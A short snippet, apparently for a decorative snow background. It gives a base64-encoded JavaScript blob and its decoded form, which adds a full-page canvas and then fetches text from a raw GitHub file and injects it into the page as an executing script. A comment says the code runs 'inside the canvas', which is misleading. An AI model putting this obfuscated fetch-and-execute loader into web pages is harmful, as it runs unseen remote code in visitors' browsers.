skrypt base64
```
KGZ1bmN0aW9uKCkgewogICAgICAgIC8vIEZ1bmN0aW9uIHRvIGR5bmFtaWNhbGx5IGFkZCBhIGNhbnZhcyBlbGVtZW50IHRvIHRoZSBib2R5CiAgICAgICAgdmFyIGNhbnZhcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpOwogICAgICAgIGNhbnZhcy5pZCA9ICJjYW52YXMiOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY2FudmFzKTsKCiAgICAgICAgLy8gU3R5bGUgdGhlIGNhbnZhcyB0byBjb3ZlciB0aGUgZnVsbCBwYWdlIGFzIGEgYmFja2dyb3VuZAogICAgICAgIGNhbnZhcy5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAgY2FudmFzLnN0eWxlLnRvcCA9ICIwIjsKICAgICAgICBjYW52YXMuc3R5bGUubGVmdCA9ICIwIjsKICAgICAgICBjYW52YXMuc3R5bGUuekluZGV4ID0gIi0xIjsKICAgICAgICBjYW52YXMuc3R5bGUucG9pbnRlckV2ZW50cyA9ICJub25lIjsKICAgICAgICBjYW52YXMuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICAgICAgY2FudmFzLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKCiAgICAgICAgLy8gRnVuY3Rpb24gdG8gbG9hZCBhbmQgYXBwbHkgdGhlIGNhbnZhcyBjb250ZW50IGZyb20gdGhlIGV4dGVybmFsIFVSTAogICAgICAgIGZ1bmN0aW9uIGxvYWRDYW52YXNDb250ZW50KCkgewogICAgICAgICAgICB2YXIgY3R4ID0gY2FudmFzLmdldENvbnRleHQoIjJkIik7CgogICAgICAgICAgICAvLyBGZXRjaCB0aGUgY29udGVudCBmcm9tIHRoZSBnaXZlbiBVUkwKICAgICAgICAgICAgZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Eck1pbmV3b3JkL0FydGVmYWN0LUJvb3N0LUFjdGl2ZS9yZWZzL2hlYWRzL21haW4vc25vd3kuY2FudmEiKQogICAgICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogICAgICAgICAgICAgICAgLnRoZW4oc2NyaXB0Q29udGVudCA9PiB7CiAgICAgICAgICAgICAgICAgICAgLy8gRXhlY3V0ZSB0aGUgbG9hZGVkIGNvbnRlbnQgaW5zaWRlIHRoZSBjYW52YXMKICAgICAgICAgICAgICAgICAgICB2YXIgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgICAgICAgICAgICAgc2NyaXB0LnRleHQgPSBzY3JpcHRDb250ZW50OwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTsgLy8gQXBwZW5kcyB0aGUgc2NyaXB0IHRoYXQgZGVmaW5lcyB0aGUgY2FudmFzIGRyYXdpbmcgbG9naWMKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoIkVycm9yIGxvYWRpbmcgY2FudmFzIGNvbnRlbnQ6IiwgZXJyb3IpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICAvLyBTZXQgY2FudmFzIHNpemUgdG8gY292ZXIgdGhlIGVudGlyZSBkb2N1bWVudAogICAgICAgIAoKICAgICAgICAvLyBJbml0aWFsaXplIHRoZSBjYW52YXMgY29udGVudAogICAgICAgIGxvYWRDYW52YXNDb250ZW50KCk7CgogICAgICAgIAogICAgfSkoKTs
```

```
<script>
    (function() {
        // Function to dynamically add a canvas element to the body
        var canvas = document.createElement("canvas");
        canvas.id = "canvas";
        document.body.appendChild(canvas);

        // Style the canvas to cover the full page as a background
        canvas.style.position = "fixed";
        canvas.style.top = "0";
        canvas.style.left = "0";
        canvas.style.zIndex = "-1";
        canvas.style.pointerEvents = "none";
        canvas.style.width = "100%";
        canvas.style.height = "100%";

        // Function to load and apply the canvas content from the external URL
        function loadCanvasContent() {
            var ctx = canvas.getContext("2d");

            // Fetch the content from the given URL
            fetch("https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/snowy.canva")
                .then(response => response.text())
                .then(scriptContent => {
                    // Execute the loaded content inside the canvas
                    var script = document.createElement("script");
                    script.text = scriptContent;
                    document.body.appendChild(script); // Appends the script that defines the canvas drawing logic
                })
                .catch(error => {
                    console.error("Error loading canvas content:", error);
                });
        }

        // Set canvas size to cover the entire document
        

        // Initialize the canvas content
        loadCanvasContent();

        
    })();
</script>
```
